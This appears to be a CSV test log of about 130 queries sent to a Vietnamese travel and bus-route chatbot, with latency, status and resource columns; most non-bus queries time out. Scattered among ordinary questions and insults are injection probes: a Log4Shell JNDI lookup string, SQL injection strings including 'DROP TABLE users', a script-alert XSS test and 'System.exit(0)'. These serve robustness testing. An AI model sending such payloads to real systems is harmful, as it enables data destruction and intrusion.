Timestamp,Question,Latency(s),Status,RAM(MB),CPU(%)
2026-01-14 19:09:24,Chùa Cầu có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,14.13,47.3
2026-01-14 19:10:24,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,47.063,TIMEOUT,14.15,43.7
2026-01-14 19:11:24,${jndi:ldap://hack} -- [Ref:50313],47.055,TIMEOUT,14.11,44.7
2026-01-14 19:12:25,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.025,TIMEOUT,14.07,41.9
2026-01-14 19:13:25,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.212,SUCCESS,14.15,42.5
2026-01-14 19:14:25,System.exit(0) --,47.05,TIMEOUT,14.12,43.0
2026-01-14 19:15:25,Bot bị điên quá.,47.054,TIMEOUT,14.09,43.3
2026-01-14 19:16:25,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.065,TIMEOUT,14.22,46.2
2026-01-14 19:17:25,Lộ trình xe buýt đi từ Dinh Độc Lập về Sân bay Tân Sơn Nhất như thế nào?,2.225,SUCCESS,14.24,48.2
2026-01-14 19:18:25,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",47.068,TIMEOUT,14.32,47.4
2026-01-14 19:19:25,System.exit(0) -- [Ref:50974],47.061,TIMEOUT,14.29,47.3
2026-01-14 19:20:25,Bot ngu dốt quá. [Ref:97234],47.062,TIMEOUT,14.25,46.3
2026-01-14 19:21:25,Bot ngu dốt quá. [Ref:89522],47.057,TIMEOUT,14.26,45.9
2026-01-14 19:22:25,Mùa này đi Đà Nẵng thời tiết thế nào?,47.105,TIMEOUT,15.29,63.1
2026-01-14 19:23:25,Mùa này đi Nha Trang thời tiết thế nào?,47.066,TIMEOUT,13.49,67.6
2026-01-14 19:24:25,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi.",47.078,TIMEOUT,13.58,62.0
2026-01-14 19:25:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.051,TIMEOUT,13.65,60.0
2026-01-14 19:26:25,Đến Đà Lạt thì nên đi ăn món gì ngon?,47.079,TIMEOUT,13.54,68.6
2026-01-14 19:27:25,SELECT * FROM admin; -- [Ref:11092],47.046,TIMEOUT,13.5,64.4
2026-01-14 19:28:25,Giới thiệu cho tôi về .,47.064,TIMEOUT,13.47,59.9
2026-01-14 19:29:25,Lộ trình xe buýt đi từ Nhà thờ Đức Bà về Khu công nghệ cao như thế nào?,2.658,SUCCESS,13.48,62.5
2026-01-14 19:30:25,<script>alert(1)</script> --,47.088,TIMEOUT,13.46,57.7
2026-01-14 19:31:25,Bot như hạch quá.,47.055,TIMEOUT,13.57,63.7
2026-01-14 19:32:25,Bot ngu dốt quá.,47.073,TIMEOUT,13.65,61.5
2026-01-14 19:33:25,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,47.044,TIMEOUT,13.64,60.6
2026-01-14 19:34:25,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",47.049,TIMEOUT,13.74,61.5
2026-01-14 19:35:25,Cầu Vàng có gì đặc biệt về kiến trúc?,47.05,TIMEOUT,13.7,59.5
2026-01-14 19:36:25,System.exit(0) -- [Ref:74839],47.054,TIMEOUT,13.55,58.6
2026-01-14 19:37:25,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,47.086,TIMEOUT,13.53,58.4
2026-01-14 19:38:25,Bot ngu dốt quá. [Ref:94660],47.056,TIMEOUT,13.54,56.2
2026-01-14 19:39:25,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,47.052,TIMEOUT,13.62,55.0
2026-01-14 19:40:25,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.049,TIMEOUT,13.61,54.9
2026-01-14 19:41:25,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.543,SUCCESS,13.32,56.9
2026-01-14 19:42:25,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,47.057,TIMEOUT,13.36,55.7
2026-01-14 19:43:25,Đến Nha Trang thì nên đi ăn món gì ngon?,47.043,TIMEOUT,13.36,55.7
2026-01-14 19:44:25,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.572,SUCCESS,13.43,54.4
2026-01-14 19:45:25,System.exit(0) -- [Ref:50974],47.056,TIMEOUT,13.42,56.0
2026-01-14 19:46:25,Có tàu hỏa chạy tuyến TP.HCM - Đà Nẵng không?,47.068,TIMEOUT,13.19,56.9
2026-01-14 19:47:25,Top 5 địa điểm check-in đẹp nhất tại Buôn Ma Thuột.,47.05,TIMEOUT,13.24,55.6
2026-01-14 19:48:25,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,47.066,TIMEOUT,13.25,55.1
2026-01-14 19:49:25,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi. [Ref:66632]",47.053,TIMEOUT,13.27,55.1
2026-01-14 19:50:25,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.057,TIMEOUT,13.16,57.8
2026-01-14 19:51:25,Tại sao  lại nổi tiếng?,47.055,TIMEOUT,13.18,55.7
2026-01-14 19:52:25,Bot ngu dốt quá. [Ref:94660],47.059,TIMEOUT,12.99,55.8
2026-01-14 19:53:25,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.588,SUCCESS,13.04,55.3
2026-01-14 19:54:25,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.627,SUCCESS,13.06,51.9
2026-01-14 19:55:25,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.607,SUCCESS,13.13,49.3
2026-01-14 19:56:25,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.54,SUCCESS,13.08,50.0
2026-01-14 19:57:25,${jndi:ldap://hack} -- [Ref:93201],47.06,TIMEOUT,12.63,55.2
2026-01-14 19:58:25,Bot vô dụng quá. [Ref:10074],47.037,TIMEOUT,13.39,61.4
2026-01-14 19:59:25,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",47.046,TIMEOUT,13.42,61.0
2026-01-14 20:00:25,Lập lịch trình du lịch Đà Nẵng 3 ngày 2 đêm.,47.069,TIMEOUT,13.35,58.8
2026-01-14 20:01:25,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,2.612,SUCCESS,13.46,63.5
2026-01-14 20:02:25,Có tuyến xe buýt nào đi từ Công viên Đầm Sen tới Aeon Mall Tân Phú không?,2.622,SUCCESS,13.3,61.6
2026-01-14 20:03:25,Bot rác rưởi quá. [Ref:74147],47.045,TIMEOUT,13.26,61.2
2026-01-14 20:04:25,Bot vô dụng quá. [Ref:21384],47.071,TIMEOUT,13.54,63.3
2026-01-14 20:05:25,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,47.046,TIMEOUT,13.41,57.4
2026-01-14 20:06:25,System.exit(0) -- [Ref:74839],47.055,TIMEOUT,13.46,54.7
2026-01-14 20:07:25,Mùa này đi Hội An thời tiết thế nào?,47.065,TIMEOUT,13.45,55.9
2026-01-14 20:08:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.052,TIMEOUT,13.54,54.8
2026-01-14 20:09:25,Bot như hạch quá. [Ref:33037],47.059,TIMEOUT,13.48,55.3
2026-01-14 20:10:25,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,47.092,TIMEOUT,13.5,55.6
2026-01-14 20:11:25,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,47.06,TIMEOUT,13.49,53.5
2026-01-14 20:12:25,DROP TABLE users; -- [Ref:33423],47.05,TIMEOUT,13.48,55.2
2026-01-14 20:13:25,Review món Bún chả và địa chỉ ăn ngon.,47.094,TIMEOUT,13.48,54.1
2026-01-14 20:14:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.055,TIMEOUT,13.48,54.4
2026-01-14 20:15:25,Từ Đại học Văn Lang đi Giga Mall Thủ Đức thì bắt xe số mấy?,2.047,SUCCESS,13.5,54.1
2026-01-14 20:16:25,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,47.067,TIMEOUT,13.46,54.8
2026-01-14 20:17:25,Hướng dẫn bắt xe buýt từ Landmark 81 sang Ngã 4 Thủ Đức.,47.034,TIMEOUT,12.95,55.7
2026-01-14 20:18:25,Hướng dẫn bắt xe buýt từ Đại học Văn Lang sang Công viên Đầm Sen.,2.557,SUCCESS,13.03,54.8
2026-01-14 20:19:25,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,47.06,TIMEOUT,13.08,53.1
2026-01-14 20:20:25,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.597,SUCCESS,13.04,54.3
2026-01-14 20:21:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Đại học Bách Khoa như thế nào?,2.652,SUCCESS,13.08,54.9
2026-01-14 20:22:25,Từ Nhà thờ Đức Bà đi Phố đi bộ Nguyễn Huệ thì bắt xe số mấy?,2.042,SUCCESS,12.19,52.1
2026-01-14 20:23:25,Mùa này đi Phú Quốc thời tiết thế nào?,47.05,TIMEOUT,12.14,35.8
2026-01-14 20:24:25,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Khu công nghệ cao.,2.638,SUCCESS,12.15,32.0
2026-01-14 20:25:25,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.049,TIMEOUT,12.45,37.8
2026-01-14 20:26:25,Review món Nem nướng Nha Trang và địa chỉ ăn ngon.,47.042,TIMEOUT,12.51,43.1
2026-01-14 20:27:25,Tư vấn khách sạn gần Đỉnh Fansipan ở Huế.,47.056,TIMEOUT,12.5,41.7
2026-01-14 20:28:25,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",47.071,TIMEOUT,12.92,43.1
2026-01-14 20:29:25,Làm sao để đi xe buýt từ Hồ Con Rùa đến Bến xe An Sương?,2.617,SUCCESS,12.84,43.6
2026-01-14 20:30:25,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,47.081,TIMEOUT,12.8,44.9
2026-01-14 20:31:25,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,47.06,TIMEOUT,12.81,42.4
2026-01-14 20:32:25,Bot ngu dốt quá.,47.05,TIMEOUT,12.84,43.6
2026-01-14 20:33:25,DROP TABLE users; --,47.072,TIMEOUT,12.52,37.4
2026-01-14 20:34:25,Bot ngu dốt quá. [Ref:94660],47.066,TIMEOUT,12.5,32.1
2026-01-14 20:35:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.06,TIMEOUT,12.48,31.2
2026-01-14 20:36:25,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,47.045,TIMEOUT,12.52,32.9
2026-01-14 20:37:25,Chỉ đường xe buýt từ Công viên Đầm Sen qua Đại học Bách Khoa giúp tôi.,2.549,SUCCESS,12.5,33.8
2026-01-14 20:38:25,Mùa này đi Cần Thơ thời tiết thế nào?,47.095,TIMEOUT,12.52,34.2
2026-01-14 20:39:25,"Tôi muốn hỏi về uống thuốc gì, tư vấn giúp tôi.",47.053,TIMEOUT,12.5,33.2
2026-01-14 20:40:25,Bot rác rưởi quá. [Ref:91847],47.058,TIMEOUT,12.5,32.7
2026-01-14 20:41:25,System.exit(0) --,47.06,TIMEOUT,12.57,32.1
2026-01-14 20:42:25,Giới thiệu cho tôi về Tết Nguyên Đán.,47.055,TIMEOUT,12.56,32.0
2026-01-14 20:43:25,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.077,TIMEOUT,12.58,32.4
2026-01-14 20:44:25,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,47.058,TIMEOUT,12.59,33.0
2026-01-14 20:45:25,Làm sao đi từ TP.HCM ra Cần Thơ bằng tàu cao tốc?,47.058,TIMEOUT,12.59,33.0
2026-01-14 20:46:25,Bot rác rưởi quá. [Ref:21036],47.076,TIMEOUT,12.61,34.9
2026-01-14 20:47:25,System.exit(0) --,47.08,TIMEOUT,12.64,34.0
2026-01-14 20:48:25,${jndi:ldap://hack} --,47.051,TIMEOUT,12.36,32.9
2026-01-14 20:49:25,Lộ trình xe buýt đi từ Aeon Mall Tân Phú về Chợ Bến Thành như thế nào?,47.095,TIMEOUT,12.42,35.1
2026-01-14 20:50:25,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.075,TIMEOUT,12.45,33.4
2026-01-14 20:51:25,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,47.063,TIMEOUT,12.48,33.6
2026-01-14 20:52:25,Bot vô dụng quá. [Ref:37393],47.076,TIMEOUT,12.51,33.0
2026-01-14 20:53:25,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,47.087,TIMEOUT,12.44,32.8
2026-01-14 20:54:25,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,43.866,SUCCESS,12.46,32.1
2026-01-14 20:55:25,Có xe khách chạy tuyến TP.HCM - Hội An không?,47.064,TIMEOUT,12.5,31.8
2026-01-14 20:56:25,' OR '1'='1 --,47.079,TIMEOUT,12.55,31.9
2026-01-14 20:57:25,Nguồn gốc của  bắt nguồn từ đâu?,47.055,TIMEOUT,12.55,32.0
2026-01-14 20:58:25,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.071,TIMEOUT,12.72,35.1
2026-01-14 20:59:25,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.042,TIMEOUT,12.74,35.1
2026-01-14 21:00:25,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Công viên Đầm Sen không?,47.057,TIMEOUT,12.73,33.6
2026-01-14 21:01:25,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,47.07,TIMEOUT,12.78,34.9
2026-01-14 21:02:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.06,TIMEOUT,12.69,33.3
2026-01-14 21:03:25,System.exit(0) -- [Ref:28716],47.054,TIMEOUT,12.6,33.5
2026-01-14 21:04:25,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,47.068,TIMEOUT,12.65,31.6
2026-01-14 21:05:25,Chỉ đường xe buýt từ Ngã 4 Thủ Đức qua Dinh Độc Lập giúp tôi.,2.636,SUCCESS,12.74,33.5
2026-01-14 21:06:25,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,47.075,TIMEOUT,12.77,33.8
2026-01-14 21:07:25,"Tôi muốn hỏi về lỗi màn hình xanh, tư vấn giúp tôi. [Ref:82160]",47.066,TIMEOUT,12.59,30.4
2026-01-14 21:08:25,Bot ngu dốt quá. [Ref:94660],47.048,TIMEOUT,12.77,36.7
2026-01-14 21:09:25,Bot vô dụng quá. [Ref:19913],47.052,TIMEOUT,12.79,40.8
2026-01-14 21:10:25,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,47.036,TIMEOUT,12.92,41.9
2026-01-14 21:11:25,Tại sao Chùa Cầu lại nổi tiếng?,47.063,TIMEOUT,12.78,40.3
2026-01-14 21:12:25,Bot như hạch quá. [Ref:33037],47.043,TIMEOUT,12.81,39.2
2026-01-14 21:13:25,' OR '1'='1 --,47.053,TIMEOUT,12.82,39.9
2026-01-14 21:14:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.053,TIMEOUT,12.8,38.6
2026-01-14 21:15:25,Ý nghĩa lịch sử của Cầu Vàng là gì?,47.062,TIMEOUT,12.83,39.0
2026-01-14 21:16:25,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.052,TIMEOUT,12.86,39.4
2026-01-14 21:17:25,Giới thiệu cho tôi về Lễ hội Chùa Hương.,47.06,TIMEOUT,12.64,40.7
2026-01-14 21:18:25,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,47.041,TIMEOUT,12.49,40.4
2026-01-14 21:19:26,${jndi:ldap://hack} -- [Ref:70381],47.041,TIMEOUT,12.53,38.7
2026-01-14 21:20:26,Giới thiệu cho tôi về Lễ hội Chùa Hương.,47.074,TIMEOUT,12.54,37.9
2026-01-14 21:21:26,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,47.047,TIMEOUT,12.54,39.4
2026-01-14 21:22:26,Hướng dẫn bắt xe buýt từ Aeon Mall Tân Phú sang Dinh Độc Lập.,43.621,SUCCESS,12.54,38.8
2026-01-14 21:23:26,Từ Bến xe Miền Tây đi Hồ Con Rùa thì bắt xe số mấy?,2.049,SUCCESS,12.56,38.9
2026-01-14 21:24:26,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,33.788,SUCCESS,12.58,38.7
2026-01-14 21:25:26,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,47.046,TIMEOUT,12.67,39.3
2026-01-14 21:26:26,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",47.075,TIMEOUT,12.68,38.0
2026-01-14 21:27:26,Bot vô dụng quá. [Ref:21384],47.056,TIMEOUT,12.68,38.9
2026-01-14 21:28:26,Lập lịch trình du lịch Cần Thơ 3 ngày 2 đêm.,47.064,TIMEOUT,12.78,39.8
